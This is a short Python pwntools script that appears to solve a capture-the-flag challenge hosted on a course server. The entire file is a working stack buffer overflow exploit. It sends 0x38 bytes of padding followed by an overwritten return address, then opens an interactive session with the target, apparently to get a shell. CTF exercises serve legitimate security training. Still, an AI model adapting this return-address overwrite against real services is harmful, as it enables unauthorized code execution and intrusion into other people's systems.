#!/usr/bin/python3
from pwn import *

target = remote('edu-ctf.csie.org', 10170)
payload = b'a' * 0x38 + p64(0x40068b)

target.sendlineafter( '.',  payload)
target.interactive()
